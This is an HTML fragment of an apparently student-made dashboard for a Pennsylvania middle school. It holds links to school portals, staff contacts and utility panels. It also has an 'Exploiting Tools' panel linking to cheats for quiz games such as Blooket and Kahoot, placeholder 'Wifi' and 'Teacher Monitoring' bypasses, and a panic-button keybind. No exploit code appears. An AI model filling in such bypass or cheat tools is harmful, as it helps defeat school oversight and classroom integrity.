        <div id="ipadBypasses" class="ipad-content">
          <p>Coming soon</p>
        </div>
      </div>

      <!-- Handbook Panel -->
      <div id="handbookPanel" class="info-panel">
        <h2>📘 Student Handbooks Information</h2>
        <div class="handbook-buttons">
          <a href="https://cdnsm5-ss19.sharpschool.com/UserFiles/Servers/Server_344046/File/For%20Parents/Handbooks/JAN2025A%20Elementary%20Handbook.pdf" target="_blank">Elementary Handbook (Jan 2025)</a>
          <a href="https://www.raiderweb.org/UserFiles/Servers/Server_344046/File/For%20Parents/Handbooks/JAN2025A%20Secondary%20Student%20Handbook.pdf" target="_blank">Secondary Student Handbook (Jan 2025)</a>
          <a href="https://www.raiderweb.org/UserFiles/Servers/Server_344046/File/For%20Parents/Handbooks/District%20Handbook%20copy.pdf" target="_blank">District Handbook</a>
          <a href="https://middletown.ss19.sharpschool.com/UserFiles/Servers/Server_344046/File/For%20Parents/Handbooks/JAN2025B%20RA%20Academy%20Handbook%20copy.pdf" target="_blank">RA Academy Handbook (Jan 2025)</a>
          <a href="https://www.raiderweb.org/UserFiles/Servers/Server_344046/File/For%20Parents/Handbooks/MASD%202024-2025%20Virtual%20Learning%20Plan%20RSVD%20DEC2024.pdf" target="_blank">Virtual Learning Plan (2024-2025)</a>
          <a href="https://www.raiderweb.org/UserFiles/Servers/Server_344046/File/For%20Parents/2024-2025%20Dress%20Code.docx.pdf" target="_blank">Dress Code (2024-2025)</a>
        </div>
      </div>

      <!-- Map Panel -->
      <div id="mapPanel" class="info-panel">
        <h2>🏫 School Building Map Information</h2>
        <p>Building Map Display</p>
        <div class="coming-soon">
          Building Map Coming Soon
        </div>
      </div>

      <!-- Student Websites Panel -->
      <div id="studentWebsitesPanel" class="info-panel">
        <h2>🌐 Student Website's Information</h2>
        <div class="links-list">
          <a href="https://www.raiderweb.org" target="_blank">RaiderWeb</a>
          <a href="https://middletownsd.instructure.com/login" target="_blank">Canvas Login</a>
          <a href="https://caresolace.com/site/middletownarea" target="_blank">Care Solace</a>
          <a href="https://clever.com/oauth/authorize?channel=clever&client_id=4c63c1cf623dce82caac&confirmed=true&redirect_uri=https%3A%2F%2Fclever.com%2Fin%2Fauth_callback&response_type=code&state=27d11080794f14661a58c2ec9edba8d87e50eb0160eeb669cc1bea184ce72062&district_id=55b90d2693d0390100000379" target="_blank">Clever Login</a>
          <a href="https://sso.rumba.pk12ls.com/sso/login?service=https://cat.easybridge.pk12ls.com/ca/dashboard.htm&idpmetadata=%20https://www.raiderweb.org" target="_blank">EasyBridge</a>
          <a href="https://myhealthyzone.fitnessgram.net" target="_blank">FitnessGram</a>
          <a href="https://www.raiderweb.org/student_services/hazing_reporting" target="_blank">Hazing Reporting</a>
          <a href="https://www.youtube.com/user/MAHSAnnouncements?app=desktop" target="_blank">MAHS Announcements</a>
          <a href="https://id.naviance.com" target="_blank">Naviance</a>
          <a href="https://raiderweb.follettdestiny.com/portal/portal?appId=destiny-SD5T-TB6F" target="_blank">Destiny Library</a>
          <a href="https://powerschool.raiderweb.org/public/" target="_blank">PowerSchool</a>
          <a href="https://idp-awsprod1.education.scholastic.com/idp/" target="_blank">Scholastic</a>
          <a href="https://www.safe2saypa.org" target="_blank">Safe2Say</a>
          <a href="https://mail.google.com/mail/" target="_blank">Gmail</a>
          <a href="https://www.balfour.com/pennsylvania/middletown/middletown-area-high-school" target="_blank">Balfour</a>
          <a href="https://raiderweb.linkit.com/Account/LogOn?ReturnUrl=%2f#" target="_blank">LinkIt!</a>
        </div>
      </div>

      <!-- Teacher Websites Panel -->
      <div id="teacherWebsitesPanel" class="info-panel">
        <h2>👩‍🏫 Teacher Websites Information</h2>
        <div class="links-list">
          <a href="https://alo.acadiencelearning.org/login" target="_blank">Acadience Learning</a>
          <a href="https://app.aimswebplus.com/#/login" target="_blank">AIMSweb Plus</a>
          <a href="https://ep1.erplinq.com/MIDDLETOWN/" target="_blank">ERP Linq</a>
          <a href="https://sso.barracuda.com/u/login/identifier?state=hKFo2SBFYnNBRjVRYmczc2t0ZjlSNmwxel9GT25LZ2o3QzVDV6Fur3VuaXZlcnNhbC1sb2dpbqN0aWTZIDQ1U0hHOGVubzF0eE10WlhiSkRZRnNQSmJqY1dwcnFlo2NpZNkgQk1yY2JuRWdkS3BkSjZRWGVjN0hiRHdlTkpMUW1MSUk" target="_blank">Barracuda</a>
          <a href="https://shop.buyguernsey.com/thmBootstrapHome.aspx" target="_blank">Buy Guernsey</a>
          <a href="https://middletownsd.instructure.com/login/ldap" target="_blank">Canvas (Teacher)</a>
          <a href="https://caresolace.com/site/middletownarea" target="_blank">Care Solace</a>
          <a href="https://clever.com/oauth/authorize?channel=clever&client_id=4c63c1cf623dce82caac&confirmed=true&redirect_uri=https%3A%2F%2Fclever.com%2Fin%2Fauth_callback&response_type=code&state=27d11080794f14661a58c2ec9edba8d87e50eb0160eeb669cc1bea184ce72062&district_id=55b90d2693d0390100000379" target="_blank">Clever (Teacher)</a>
          <a href="https://www.discoveryeducation.com" target="_blank">Discovery Education</a>
          <a href="https://sso.rumba.pk12ls.com/sso/login?service=https://cat.easybridge.pk12ls.com/ca/dashboard.htm&idpmetadata=%20https://www.raiderweb.org" target="_blank">EasyBridge (Teacher)</a>
          <a href="https://raiderweb.gofmx.com/login" target="_blank">FMX</a>
          <a href="https://myhealthyzone.fitnessgram.net" target="_blank">FitnessGram</a>
          <a href="https://login.frontlineeducation.com/login?signin=d0e98b785fd46dad06ce5509e61ef781&productId=ABSMGMT&clientId=ABSMGMT#/login" target="_blank">Frontline</a>
          <a href="https://raiderweb.linkit.com/Account/LogOn?ReturnUrl=%2f#" target="_blank">LinkIt! (Teacher)</a>
          <a href="https://id.naviance.com" target="_blank">Naviance</a>
          <a href="https://raiderweb.follettdestiny.com/portal/portal?appId=destiny-SD5T-TB6F" target="_blank">Destiny Library</a>
          <a href="https://paetep.edulinksolutions.com/login" target="_blank">PA eTEP</a>
          <a href="https://powerschool.raiderweb.org/teachers/pw.html" target="_blank">PowerSchool (Teacher)</a>
          <a href="https://idp-awsprod1.education.scholastic.com/idp/" target="_blank">Scholastic</a>
          <a href="https://go.schoolmessenger.com/#/home" target="_blank">SchoolMessenger</a>
          <a href="https://www.pdesas.org/standard/" target="_blank">PDE SAS</a>
          <a href="https://www.pbisapps.org" target="_blank">PBIS Apps</a>
          <a href="https://masd.happyfox.com/home/" target="_blank">HappyFox</a>
          <a href="https://middletownasd-pa.safeschools.com/login" target="_blank">SafeSchools</a>
          <a href="https://login.microsoftonline.com/common/oauth2/authorize?client_id=00000002-0000-0ff1-ce00-000000000000&redirect_uri=https%3a%2f%2foutlook.office.com%2fowa%2f&resource=00000002-0000-0ff1-ce00-000000000000&response_mode=form_post&response_type=code+id_token&scope=openid&msafed=1&msaredir=1&client-request-id=2318564a-0ba1-6e05-dc95-01e3d532fa2a&protectedtoken=true&claims=%7b%22id_token%22%3a%7b%22xms_cc%22%3a%7b%22values%22%3a%5b%22CP1%22%5d%7d%7d%7d&nonce=637946967978129696.e952fd14-38f0-4c99-9385-0e633dcd181b&state=DYu5EYAwDMAcOMYxiePgZxzI01KyPi6kU6MEAHuwBamEQIXVm7ioq1H1qHP6VdeghmyrYOvu6GwXlinMow8yelK8R36_O_8" target="_blank">Office 365</a>
        </div>
      </div>

      <!-- Phone Directory Panel -->
      <div id="phoneDirectoryPanel" class="info-panel">
        <h2>📞 School Phone Directory Information</h2>
        <div class="coming-soon">
          Update Coming Soon!
        </div>
      </div>

      <!-- Camera Panel -->
      <div id="cameraPanel" class="info-panel">
        <h2>📷 School Camera Information</h2>
        <div class="coming-soon">
          Update Coming Soon
        </div>
      </div>

      <!-- School Info Panel -->
      <div id="schoolInfoPanel" class="info-panel">
        <h2>🏫 School Information</h2>
        <div class="school-info-grid">
          <div class="school-info-item">
            <div class="school-info-label">School Name:</div>
            <div>Middletown Area Middle School</div>
          </div>
          <div class="school-info-item">
            <div class="school-info-label">School Address:</div>
            <div>215 Oberlin Road Middletown, PA 17057</div>
          </div>
          <div class="school-info-item">
            <div class="school-info-label">School Phone:</div>
            <div>717-930-0739</div>
          </div>
          <div class="school-info-item">
            <div class="school-info-label">School Fax:</div>
            <div>717-944-0591</div>
          </div>
          <div class="school-info-item">
            <div class="school-info-label">School Principal:</div>
            <div>Dr. Shannon L. Wevodau</div>
          </div>
          <div class="school-info-item">
            <div class="school-info-label">Principal's Phone:</div>
            <div>717-930-0739</div>
          </div>
          <div class="school-info-item">
            <div class="school-info-label">Principal's Email:</div>
            <div>swevodau@raiderweb.org</div>
          </div>
          <div class="school-info-item">
            <div class="school-info-label">Assistant Principal:</div>
            <div>Mr. Michael DeFilippo</div>
          </div>
          <div class="school-info-item">
            <div class="school-info-label">Assistant Principal's Phone:</div>
            <div>717-930-0739</div>
          </div>
          <div class="school-info-item">
            <div class="school-info-label">Assistant Principal's Email:</div>
            <div>mdefilippo@raiderweb.org</div>
          </div>
        </div>
      </div>

      <!-- Exploit Panel -->
      <div id="exploitPanel" class="info-panel">
        <h2>🧨 Exploiting Tools</h2>
        <div class="exploit-buttons">
          <a href="https://sites.google.com/view/tools-2/blooket-exploit" target="_blank">Blooket Exploit</a>
          <a href="https://sites.google.com/view/tools-2/blooket-exploit" target="_blank">Kahoot Exploit</a>
          <a href="https://sites.google.com/view/tools-2/blooket-exploit" target="_blank">Gimkit Exploit</a>
          <a href="https://sites.google.com/view/tools-2/blooket-exploit" target="_blank">Quizlet Exploit</a>
          <a href="https://sites.google.com/view/tools-2/blooket-exploit" target="_blank">Quizzes Exploit</a>
          <a href="https://sites.google.com/view/tools-2/blooket-exploit" target="_blank">Quills Exploit</a>
          <a href="https://sites.google.com/view/tools-2/blooket-exploit" target="_blank">Edpuzzle Exploit</a>
          <a href="https://sites.google.com/view/tools-2/blooket-exploit" target="_blank">Nearpod Exploit</a>
        </div>
      </div>

      <!-- Bypass Panel -->
      <div id="bypassPanel" class="info-panel">
        <h2>🚪 Bypassing Tools</h2>
        <div class="bypass-buttons">
          <button onclick="dashboard.showBypassContent('bathroom')">Bathroom Bypass</button>
          <button onclick="dashboard.showBypassContent('wifi')">Wifi Bypass</button>
          <button onclick="dashboard.showBypassContent('monitoring')">Teacher Monitoring Bypass</button>
          <button onclick="dashboard.showBypassContent('coming1')">Coming Soon</button>
          <button onclick="dashboard.showBypassContent('coming2')">Coming Soon</button>
          <button onclick="dashboard.showBypassContent('coming3')">Coming Soon</button>
        </div>

        <div id="bathroomBypass" class="bypass-content">
          <p>COMING SOON</p>
        </div>

        <div id="wifiBypass" class="bypass-content">
          <p>Go to School Wifi Information</p>
        </div>

        <div id="monitoringBypass" class="bypass-content">
          <p>COMING SOON</p>
        </div>

        <div id="coming1Bypass" class="bypass-content">
          <p>COMING SOON</p>
        </div>

        <div id="coming2Bypass" class="bypass-content">
          <p>COMING SOON</p>
        </div>

        <div id="coming3Bypass" class="bypass-content">
          <p>COMING SOON</p>
        </div>
      </div>

      <!-- VPN Panel -->
      <div id="vpnPanel" class="info-panel">
        <h2>🔐 VPN Websites</h2>
        <div class="links-list">
          <a href="https://example-vpn1.com" target="_blank">VPN Service 1</a>
          <a href="https://example-vpn2.com" target="_blank">VPN Service 2</a>
          <a href="https://example-vpn3.com" target="_blank">VPN Service 3</a>
          <a href="https://example-vpn4.com" target="_blank">VPN Service 4</a>
        </div>
      </div>

      <!-- Gaming Panel -->
      <div id="gamingPanel" class="info-panel">
        <h2>🎮 Gaming Websites</h2>
        <div class="coming-soon">
          COMING SOON
        </div>
      </div>

      <!-- Music Panel -->
      <div id="musicPanel" class="info-panel">
        <h2>🎵 Music Websites</h2>
        <div class="coming-soon">
          COMING SOON
        </div>
      </div>

      <!-- Keyboard Panel -->
      <div id="keyboardPanel" class="info-panel">
        <h2>🎹 Keyboard Tricks</h2>
        <div class="info-text">
          <p>System Shortcuts:
• Access Spotlight Search: Press Command (⌘) + Space bar.
• Return to the Home screen: Press Command (⌘) + H.
• Show the Dock: Press Command (⌘) + Option (⌥) + D.
• Show the App Library: Press Shift (⇧) + Globe + A.
• Open Quick Note: Press Globe + Q.
• Open Siri: Press Globe + S.
• Open Control Center: Press Globe + C.
• Open Notification Center: Press Globe + N.
• Show all windows: Press Globe + Down Arrow.
• Open the App Switcher: Press Globe + Up Arrow.
Multitasking Shortcuts:
• Switch to the last active app: Press Command (⌘) + Tab.
• View all active apps: Press and hold Command (⌘) + Tab.
• Open Split View: Press Control (⌃) + Globe + Left Arrow to move an app to the left, or Control (⌃) + Globe + Right Arrow to move it to the right.
• Switch the position of apps in Split View: Press Control (⌃) + Globe + Left or Right Arrow.
• Open Slide Over: Press Globe + Backslash.
• Move the Slide Over window: Press Option (⌥) + Globe + Left or Right Arrow.
Safari and App-Specific Shortcuts:
• Take a full-screen screenshot: Press Command (⌘) + Shift + 3.
• Take a screenshot and enter markup immediately: Press Command (⌘) + Shift + 4.
• Open a new private tab: Press Command (⌘) + Shift + N.
• Open a new tab: Press Command (⌘) + T or Command (⌘) + N.
• Close the current tab: Press Command (⌘) + W.
• Close all tabs in Tab Grid: Press Shift + Command (⌘) + W.
• Go to the next tab: Press Option (⌥) + Command (⌘) + Right Arrow, or Control (⌃) + Tab, or Command (⌘) + }.
• Go to the previous tab: Press Option (⌥) + Command (⌘) + Left Arrow, or Shift + Control (⌃) + Tab, or Command (⌘) + {.
• Reopen the last closed tab: Press Shift + Command (⌘) + T.
• Go to a specific tab (1-8): Press Command (⌘) + (1-8).
• Go to the last tab: Press Command (⌘) + 9.
• Open the Tab Grid: Press Shift + Command (⌘) + .
• Open a new Incognito tab: Press Shift + Command (⌘) + N.
• Open a new Incognito window: Press Option (⌥) + Shift + Command (⌘) + N.
• Open a new window: Press Option (⌥) + Command (⌘) + N.
General Navigation and Text Editing:
• Navigate between elements in an app (like fields, lists, buttons): Press Tab.
• Select all text: Press Command (⌘) + A.
• Copy selected text: Press Command (⌘) + C.
• Cut selected text: Press Command (⌘) + X.
• Paste copied text: Press Command (⌘) + V.
• Undo the last action: Press Command (⌘) + Z.
• Redo the last undone action: Press Command (⌘) + Shift + Z.
• Jump to the top of a page: Press Command (⌘) + Up Arrow.
• Jump to the bottom of a page: Press Command (⌘) + Down Arrow.
• Highlight text one character at a time: Press Shift + Left or Right Arrow.
To view all available shortcuts for the specific app you are using, press and hold the Command (⌘) key. For a complete list of system-wide shortcuts, press and hold the Globe key on a compatible keyboard.</p>
        </div>
      </div>

      <!-- Settings Panel -->
      <div id="settingsPanel" class="info-panel">
        <h2>⚙️ Settings</h2>
        <div class="settings-grid" style="display: grid; grid-template-columns: 1fr 1fr; gap: 15px;">
          <!-- Existing and new settings will be added here -->
          <div class="setting-item">
            <label for="settingsThemeToggle">Theme:
              <span class="toggle-switch" style="width:40px; height:20px;">
                <input type="checkbox" id="settingsThemeToggle" />
                <span class="slider round" style="border-radius:20px;"></span>
              </span>
            </label>
            <span id="settingsThemeLabel" style="font-size:0.9em; margin-left:10px;">Dark</span>
          </div>
          <div class="setting-item">
            <label for="animationToggle">Disable Animations:
              <span class="toggle-switch" style="width:40px; height:20px;">
                <input type="checkbox" id="animationToggle" />
                <span class="slider round" style="border-radius:20px;"></span>
              </span>
            </label>
          </div>
          <div class="setting-item">
            <label for="loggingLevel">Logging Level:
              <select id="loggingLevel" style="background: #333; color: white; border: none; padding: 5px; border-radius: 5px;">
                <option value="high">High</option>
                <option value="medium">Medium</option>
                <option value="low">Low</option>
              </select>
            </label>
          </div>
          <div class="setting-item">
            <label for="dashboardLayout">Default Layout:
              <select id="dashboardLayout" style="background: #333; color: white; border: none; padding: 5px; border-radius: 5px;">
                <option value="grid">Grid</option>
                <option value="rows">Rows</option>
              </select>
            </label>
          </div>
          <div class="setting-item">
            <label for="defaultPanelOnStartup">Default Panel on Startup:
              <select id="defaultPanelOnStartup" style="background: #333; color: white; border: none; padding: 5px; border-radius: 5px;">
                <option value="none">None</option>
                <option value="wifiPanel">WiFi Info</option>
                <option value="calendarBox">Calendar</option>
                <!-- Add other panels -->
              </select>
            </label>
          </div>
          <div class="setting-item">
            <label for="resetLayout">
              <button id="resetLayoutBtn" style="background-color: #e74c3c; color: white; border-radius: 5px; padding: 8px;">Reset Layout</button>
            </label>
          </div>
          <div class="setting-item">
            <label for="clearAllLogs">
              <button id="clearAllLogsBtn" style="background-color: #e74c3c; color: white; border-radius: 5px; padding: 8px;">Clear Local Logs</button>
            </label>
          </div>
          <div class="setting-item">
            <label for="autoSaveNotes">Auto-save Notes:
              <span class="toggle-switch" style="width:40px; height:20px;">
                <input type="checkbox" id="autoSaveNotes" checked />
                <span class="slider round" style="border-radius:20px;"></span>
              </span>
            </label>
          </div>
          <div class="setting-item">
            <label for="enableTooltips">Enable Tooltips:
              <span class="toggle-switch" style="width:40px; height:20px;">
                <input type="checkbox" id="enableTooltips" checked />
                <span class="slider round" style="border-radius:20px;"></span>
              </span>
            </label>
          </div>
          <div class="setting-item">
            <label for="notificationVolume">Notification Sound (alerts are visual only):
                <input type="range" id="notificationVolume" min="0" max="100" value="0" />
            </label>
          </div>
          <div class="setting-item">
              <label for="enableHighContrast">High Contrast Mode:
                <span class="toggle-switch" style="width:40px; height:20px;">
                  <input type="checkbox" id="enableHighContrast" />
                  <span class="slider round" style="border-radius:20px;"></span>
                </span>
              </label>
          </div>
          <div class="setting-item">
            <label for="languageSelect">Language:
              <select id="languageSelect" style="background: #333; color: white; border: none; padding: 5px; border-radius: 5px;">
                <option value="en">English</option>
                <option value="es">Spanish</option>
              </select>
            </label>
          </div>
          <div class="setting-item">
            <label for="enableGestures">Touch Gestures:
              <span class="toggle-switch" style="width:40px; height:20px;">
                <input type="checkbox" id="enableGestures" checked />
                <span class="slider round" style="border-radius:20px;"></span>
              </span>
            </label>
          </div>
          <div class="setting-item">
            <label for="dataSync">Cloud Sync:
              <span class="toggle-switch" style="width:40px; height:20px;">
                <input type="checkbox" id="dataSync" />
                <span class="slider round" style="border-radius:20px;"></span>
              </span>
            </label>
          </div>
          <div class="setting-item">
            <label for="autoUpdate">Auto Update:
              <span class="toggle-switch" style="width:40px; height:20px;">
                <input type="checkbox" id="autoUpdate" checked />
                <span class="slider round" style="border-radius:20px;"></span>
              </span>
            </label>
          </div>
        </div>
      </div>

      <!-- Notes Panel - will contain the canvas, controls, and text area -->
      <div id="notesPanel" class="info-panel" style="display:none; text-align: center;">
        <h2>🖌️ Notes</h2>
        <canvas id="notesCanvas" width="700" height="450"></canvas>
        <div id="canvasControls">
          <button id="toggleDrawMode">✏️ Draw Mode</button>
          <button id="toggleTextMode">📝 Text Mode</button>
          <button id="clearCanvasBtn">Clear Canvas</button>
          <button id="closeNotesBtn">Close Notes</button>
          <button id="exportNotesBtn">💾 Export Draw</button>
          <input type="color" id="drawColorPicker" value="#ff914d" title="Choose Pen Color">
          <input type="range" id="drawThicknessSlider" min="1" max="15" value="2" title="Pen Thickness">
          <button id="undoDrawBtn" disabled>↩️ Undo</button>
          <button id="redoDrawBtn" disabled>↪️ Redo</button>
          <button id="eraserBtn">🧼 Eraser</button>
        </div>
        <textarea id="textNotesArea" class="notes-text-area" placeholder="Type your notes here..." style="display:none;"></textarea>
        <button id="exportTextNotesBtn" style="background-color: #2ecc71; color: white; margin-top: 10px; padding: 8px 16px; border-radius: 8px; font-weight: bold; display:none;">💾 Export Text</button>
      </div>

      <!-- Timer/Stopwatch/Countdown Panel -->
      <div id="timerStopwatchPanel" class="info-panel" style="display:none;">
          <h2>⏱️ Timer & Stopwatch</h2>
          <div style="display:flex; justify-content:center; gap:10px; margin-bottom:15px;">
              <button id="showTimer">Timer</button>
              <button id="showStopwatch">Stopwatch</button>
              <button id="showCountdown">Countdown</button>
          </div>

          <div id="timerContent" style="display:none;">
              <h3>Timer</h3>
              <p style="font-size:2em;" id="timerDisplay">00:00</p>
              <input type="number" id="timerInput" placeholder="Minutes" min="1" max="99" style="width:100px; padding:5px; margin:10px 0; background:#333; border:1px solid #ff914d; color:white; border-radius:5px;">
              <div style="display:flex; justify-content:center; gap:10px;">
                  <button id="startTimer">Start</button>
                  <button id="pauseTimer">Pause</button>
                  <button id="resetTimer">Reset</button>
              </div>
          </div>

          <div id="stopwatchContent" style="display:none;">
              <h3>Stopwatch</h3>
              <p style="font-size:2em;" id="stopwatchDisplay">00:00:00</p>
              <div style="display:flex; justify-content:center; gap:10px;">
                  <button id="startStopwatch">Start</button>
                  <button id="pauseStopwatch">Pause</button>
                  <button id="resetStopwatch">Reset</button>
                  <button id="lapStopwatch">Lap</button>
              </div>
              <ul id="stopwatchLaps" style="list-style:none; padding:0; margin-top:15px;"></ul>
          </div>

          <div id="countdownContent" style="display:none;">
              <h3>Countdown</h3>
              <p style="font-size:2em;" id="countdownDisplay">00:00:00</p>
              <div style="display:flex; justify-content:center; gap:5px; margin:10px 0;">
                <input type="number" id="countdownHours" placeholder="HH" min="0" max="99" style="width:60px; padding:5px; background:#333; border:1px solid #ff914d; color:white; border-radius:5px; text-align:center;">:
                <input type="number" id="countdownMinutes" placeholder="MM" min="0" max="59" style="width:60px; padding:5px; background:#333; border:1px solid #ff914d; color:white; border-radius:5px; text-align:center;">:
                <input type="number" id="countdownSeconds" placeholder="SS" min="0" max="59" style="width:60px; padding:5px; background:#333; border:1px solid #ff914d; color:white; border-radius:5px; text-align:center;">
              </div>
              <div style="display:flex; justify-content:center; gap:10px;">
                  <button id="startCountdown">Start</button>
                  <button id="pauseCountdown">Pause</button>
                  <button id="resetCountdown">Reset</button>
              </div>
          </div>
      </div>

      <!-- Calculator Panel -->
      <div id="calculatorPanel" class="info-panel" style="display:none;">
          <h2>🧮 Calculator</h2>
          <div style="display:grid; grid-template-columns:1fr; gap:10px; width:280px; margin:0 auto; background:#333; padding:15px; border-radius:10px;">
              <input type="text" id="calcDisplay" value="0" readonly style="grid-column:1 / span 4; padding:15px; font-size:1.8em; text-align:right; background:#000; color:white; border:none; border-radius:5px; margin-bottom:10px;">
              <div style="display:grid; grid-template-columns:repeat(4, 1fr); gap:8px;">
                  <button class="calc-btn op-btn" data-value="(">(</button>
                  <button class="calc-btn op-btn" data-value=")">)</button>
                  <button class="calc-btn op-btn" data-value="%" style="background-color:#f39c12;">%</button>
                  <button class="calc-btn op-btn" data-value="/" style="background-color:#f39c12;">÷</button>

                  <button class="calc-btn num-btn" data-value="7">7</button>
                  <button class="calc-btn num-btn" data-value="8">8</button>
                  <button class="calc-btn num-btn" data-value="9">9</button>
                  <button class="calc-btn op-btn" data-value="*" style="background-color:#f39c12;">×</button>

                  <button class="calc-btn num-btn" data-value="4">4</button>
                  <button class="calc-btn num-btn" data-value="5">5</button>
                  <button class="calc-btn num-btn" data-value="6">6</button>
                  <button class="calc-btn op-btn" data-value="-" style="background-color:#f39c12;">-</button>

                  <button class="calc-btn num-btn" data-value="1">1</button>
                  <button class="calc-btn num-btn" data-value="2">2</button>
                  <button class="calc-btn num-btn" data-value="3">3</button>
                  <button class="calc-btn op-btn" data-value="+" style="background-color:#f39c12;">+</button>

                  <button class="calc-btn clear-btn" data-value="C" style="background-color:#e74c3c;">C</button>
                  <button class="calc-btn num-btn" data-value="0">0</button>
                  <button class="calc-btn num-btn" data-value=".">.</button>
                  <button class="calc-btn eq-btn" data-value="=" style="background-color:#2ecc71;">=</button>
              </div>
          </div>
      </div>

      <!-- Unit Converter Panel -->
      <div id="unitConverterPanel" class="info-panel" style="display:none;">
          <h2>💱 Unit Converter</h2>
          <div style="display:flex; flex-direction:column; gap:15px; width:350px; margin:0 auto; background:#333; padding:20px; border-radius:10px;">
              <div>
                  <label for="convertFromValue">Amount:</label>
                  <input type="number" id="convertFromValue" value="1" style="width:100%; padding:8px; border-radius:5px; border:1px solid #ff914d; background:#1c1c1c; color:white; margin-top:5px;">
              </div>
              <div>
                  <label for="convertFromUnit">From:</label>
                  <select id="convertFromUnit" style="width:100%; padding:8px; border-radius:5px; border:1px solid #ff914d; background:#1c1c1c; color:white; margin-top:5px;">
                      <optgroup label="Length">
                          <option value="meters">Meters</option>
                          <option value="feet">Feet</option>
                          <option value="inches">Inches</option>
                          <option value="cm">Centimeters</option>
                          <option value="km">Kilometers</option>
                          <option value="miles">Miles</option>
                      </optgroup>
                      <optgroup label="Mass">
                          <option value="kilograms">Kilograms</option>
                          <option value="pounds">Pounds</option>
                          <option value="grams">Grams</option>
                          <option value="ounces">Ounces</option>
                      </optgroup>
                      <optgroup label="Temperature">
                          <option value="celsius">Celsius</option>
                          <option value="fahrenheit">Fahrenheit</option>
                          <option value="kelvin">Kelvin</option>
                      </optgroup>
                  </select>
              </div>
              <div>
                  <label for="convertToUnit">To:</label>
                  <select id="convertToUnit" style="width:100%; padding:8px; border-radius:5px; border:1px solid #ff914d; background:#1c1c1c; color:white; margin-top:5px;">
                      <!-- Options will be dynamically populated/matched with 'From' unit's group -->
                  </select>
              </div>
              <button id="performConversion" style="background-color: #2ecc71; color: white; padding: 10px 15px; border-radius: 8px; font-weight: bold; margin-top:10px;">Convert</button>
              <div id="conversionResult" style="font-size:1.2em; text-align:center; margin-top:15px; font-weight:bold;">Result:</div>
          </div>
      </div>

      <!-- Stats Panel -->
      <div id="statsPanel" class="info-panel" style="display:none;">
          <h2>📊 Usage Statistics</h2>
          <div id="statsContent" style="display: grid; grid-template-columns: 1fr 1fr; gap: 10px;">
              <div><strong>Buttons Pressed:</strong> <span id="statsButtonsPressed">0</span></div>
              <div><strong>Toggles Flipped:</strong> <span id="statsTogglesFlipped">0</span></div>
              <div><strong>Panels Opened:</strong> <span id="statsPanelsOpened">0</span></div>
              <div><strong>Panels Closed:</strong> <span id="statsPanelsClosed">0</span></div>
              <div><strong>Notes Cleared:</strong> <span id="statsNotesCleared">0</span></div>
              <div><strong>Exports Made:</strong> <span id="statsExportsMade">0</span></div>
          </div>
          <button id="resetStatsBtn" style="background-color:#e74c3c; color:white; margin-top:20px; padding:10px 15px; border-radius:8px; font-weight:bold;">Reset Statistics</button>
      </div>

      <!-- Media Panel -->
      <div id="mediaPanel" class="info-panel" style="display:none;">
          <h2>▶️ Media Player (YouTube)</h2>
          <input type="text" id="youtubeLinkInput" placeholder="Enter YouTube URL (e.g., https://www.youtube.com/watch?v=dQw4w9WgXcQ)" style="width:calc(100% - 20px); padding:8px; margin-bottom:10px; background:#1c1c1c; border:1px solid #ff914d; color:white; border-radius:5px;">
          <button id="loadYoutubeVideo" style="background-color:#ff914d; color:black; padding:8px 15px; border-radius:5px;">Load Video</button>
          <div id="youtubePlayerContainer" style="margin-top:20px; background:#000;">
              <p style="text-align:center; font-style:italic;">Proxy functionality for YouTube is server-side and cannot be fully implemented client-side with pure HTML/JS. This is a direct embed.</p>
              <iframe id="youtubePlayer" width="100%" height="315" src="" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture" allowfullscreen style="display:none; border-radius: 8px;"></iframe>
          </div>
      </div>

      <!-- Reminder Panel -->
      <div id="reminderPanel" class="info-panel" style="display:none;">
          <h2>🔔 Reminders</h2>
          <input type="text" id="reminderTextInput" placeholder="What do you need to remember?" style="width:calc(100% - 20px); padding:8px; margin-bottom:10px; background:#1c1c1c; border:1px solid #ff914d; color:white; border-radius:5px;">
          <input type="datetime-local" id="reminderDatetimeInput" style="width:calc(100% - 20px); padding:8px; margin-bottom:10px; background:#1c1c1c; border:1px solid #ff914d; color:white; border-radius:5px;">
          <button id="addReminderBtn" style="background-color:#2ecc71; color:white; padding:10px 15px; border-radius:8px; font-weight:bold;">Add Reminder</button>

          <h3 style="margin-top:20px;">Active Reminders:</h3>
          <ul id="reminderList" style="list-style:none; padding:0;">
              <!-- Reminders will be added here -->
          </ul>
      </div>

      <!-- Activity Log Panel -->
      <div id="activityLogPanel" class="info-panel" style="display:none;">
        <h2>📜 Activity Log</h2>
        <div id="activityLogContent" style="max-height: 400px; overflow-y: auto; background: #1c1c1c; padding: 10px; border-radius: 8px; border: 1px solid #333;">
          <!-- Log entries will be added here dynamically -->
          <p><em>No activity logged yet.</em></p>
        </div>
        <button id="clearActivityLogBtn" style="background-color:#e74c3c; color:white; margin-top:15px; padding:8px 15px; border-radius:8px; font-weight:bold;">Clear Activity Log</button>
        <button id="exportActivityLogBtn" style="background-color:#f39c12; color:white; margin-top:15px; padding:8px 15px; border-radius:8px; font-weight:bold;">Export Activity Log</button>
      </div>

      <!-- Login History Panel -->
      <div id="loginHistoryPanel" class="info-panel" style="display:none;">
        <h2>📅 Login History</h2>
        <div id="loginHistoryContent" style="max-height: 300px; overflow-y: auto; background: #1c1c1c; padding: 10px; border-radius: 8px; border: 1px solid #333;">
          <!-- Login history entries will be added here dynamically -->
          <p><em>No login history available.</em></p>
        </div>
      </div>

      <!-- Keybinds Panel -->
      <div id="keybindsPanel" class="info-panel" style="display:none;">
          <h2>⌨️ Keybinds Configuration</h2>
          <p>Customize your keyboard shortcuts:</p>
          <div id="keybindsConfig" style="display:grid; grid-template-columns:1fr 1fr; gap:10px; margin-top:15px;">
              <!-- Keybinds will be dynamically loaded/managed -->
              <div class="keybind-item" style="display:flex; justify-content:space-between; align-items:center; background:#1c1c1c; padding:10px; border-radius:5px;">
                  <span>Toggle Notes:</span>
                  <input type="text" data-action="toggleNotes" class="keybind-input" value="N" readonly style="width:50px; text-align:center; background:#333; color:white; border:none; padding:5px; border-radius:3px;">
              </div>
              <div class="keybind-item" style="display:flex; justify-content:space-between; align-items:center; background:#1c1c1c; padding:10px; border-radius:5px;">
                  <span>Panic Button:</span>
                  <input type="text" data-action="panic" class="keybind-input" value="P" readonly style="width:50px; text-align:center; background:#333; color:white; border:none; padding:5px; border-radius:3px;">
              </div>
